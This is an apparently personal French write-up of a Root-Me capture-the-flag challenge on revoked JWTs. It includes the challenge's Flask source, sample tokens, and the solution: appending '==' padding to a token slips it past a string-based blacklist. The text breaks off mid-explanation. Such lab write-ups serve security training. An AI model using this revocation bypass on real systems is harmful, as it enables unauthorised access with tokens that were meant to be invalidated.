# [JWT - Jeton révoqué](https://www.root-me.org/fr/Challenges/Web-Serveur/JWT-Jeton-revoque)

[Challenge >>](http://challenge01.root-me.org/web-serveur/ch63/)

Deux endpoints sont disponibles :

POST : /web-serveur/ch63/login
GET : /web-serveur/ch63/admin
Obtenez un accès au endpoint /web-serveur/ch63/admin.

## <a id="source_code"> Code source

````python 
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from flask import Flask, request, jsonify
from flask_jwt_extended import JWTManager, jwt_required, create_access_token, decode_token
import datetime
from apscheduler.schedulers.background import BackgroundScheduler
import threading
import jwt
from config import *
 
# Setup flask
app = Flask(__name__)
 
app.config['JWT_SECRET_KEY'] = SECRET
jwtmanager = JWTManager(app)
blacklist = set()
lock = threading.Lock()
 
# Free memory from expired tokens, as they are no longer useful
def delete_expired_tokens():
    with lock:
        to_remove = set()
        global blacklist
        for access_token in blacklist:
            try:
                jwt.decode(access_token, app.config['JWT_SECRET_KEY'],algorithm='HS256')
            except:
                to_remove.add(access_token)
       
        blacklist = blacklist.difference(to_remove)
 
@app.route("/web-serveur/ch63/")
def index():
    return "POST : /web-serveur/ch63/login <br>\nGET : /web-serveur/ch63/admin"
 
# Standard login endpoint
@app.route('/web-serveur/ch63/login', methods=['POST'])
def login():
    try:
        username = request.json.get('username', None)
        password = request.json.get('password', None)
    except:
        return jsonify({"msg":"""Bad request. Submit your login / pass as {"username":"admin","password":"admin"}"""}), 400
 
    if username != 'admin' or password != 'admin':
        return jsonify({"msg": "Bad username or password"}), 401
 
    access_token = create_access_token(identity=username,expires_delta=datetime.timedelta(minutes=3))
    ret = {
        'access_token': access_token,
    }
   
    with lock:
        blacklist.add(access_token)
 
    return jsonify(ret), 200
 
# Standard admin endpoint
@app.route('/web-serveur/ch63/admin', methods=['GET'])
@jwt_required
def protected():
    access_token = request.headers.get("Authorization").split()[1]
    with lock:
        if access_token in blacklist:
            return jsonify({"msg":"Token is revoked"})
        else:
            return jsonify({'Congratzzzz!!!_flag:': FLAG})
 
 
if __name__ == '__main__':
    scheduler = BackgroundScheduler()
    job = scheduler.add_job(delete_expired_tokens, 'interval', seconds=10)
    scheduler.start()
    app.run(debug=False, host='0.0.0.0', port=5000)


```

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NzM2MDk1ODksIm5iZiI6MTY3MzYwOTU4OSwianRpIjoiNGJlY2ZkZGEtM2IzYy00MGY0LTkyYjAtMjM4YTM5N2ZjYWMwIiwiZXhwIjoxNjczNjA5NzY5LCJpZGVudGl0eSI6ImFkbWluIiwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.rai2Ia7UpTutOZILaeSSw0I5HBKTTwtjVU5-Gmq3tmA

HEADER
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.


PAYLOAD

eyJpYXQiOjE2NzM2MDk1ODksIm5iZiI6MTY3MzYwOTU4OSwianRpIjoiNGJlY2ZkZGEtM2IzYy00MGY0LTkyYjAtMjM4YTM5N2ZjYWMwIiwiZXhwIjoxNjczNjA5NzY5LCJpZGVudGl0eSI6ImFkbWluIiwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.

SIGN

rai2Ia7UpTutOZILaeSSw0I5HBKTTwtjVU5-Gmq3tmA



eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NzM2MDk1ODksIm5iZiI6MTY3MzYwOTU4OSwianRpIjoiNGJlY2ZkZGEtM2IzYy00MGY0LTkyYjAtMjM4YTM5N2ZjYWMwIiwiZXhwIjoxNjczNjA5NzY5LCJpZGVudGl0eSI6ImFkbWluIiwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.rai2Ia7UpTutOZILaeSSw0I5HBKTTwtjVU5-Gmq3tmA=


eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NzM2MTAzMjcsIm5iZiI6MTY3MzYxMDMyNywianRpIjoiNmQ1YWVlYTUtMmQ2MS00NjRhLWFjM2EtNGQ1ODNjYzc0ZTc1IiwiZXhwIjoxNjczNjEwNTA3LCJpZGVudGl0eSI6ImFkbWluIiwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.89LGjwamLGa72QnX4ZYeOen6AfHxVK2nt8Ums_VgmHc==



eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NzM2MTEzNTgsIm5iZiI6MTY3MzYxMTM1OCwianRpIjoiNmQwODBkMjktNmJiYS00ZTczLTk2ZjAtMjdjM2IzOGI0OTE2IiwiZXhwIjoxNjczNjExNTM4LCJpZGVudGl0eSI6ImFkbWluIiwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.n0pfl3KHjpiN3i-VWJHYl6gyl69DBrLvSyUyYJppxdM

Dans cet exercice, on fait une première requête sur l'url

en POST http://challenge01.root-me.org/web-serveur/ch63/login
en HEADER Content-Type : application/json
en body : 
{
    "username" : "admin",
    "password" : "admin"
}

On en récupère un token JWT
On l'envoie en GET Sur http://challenge01.root-me.org/web-serveur/ch63/admin
en Authorization : Bearer + MON TOKEN + "==" (mon caractère de bourrage)
Alors pourquoi ça passe ?? 
Le token via le script python du code source, va être enregistrer en base en tant que Token révoqué, une strict 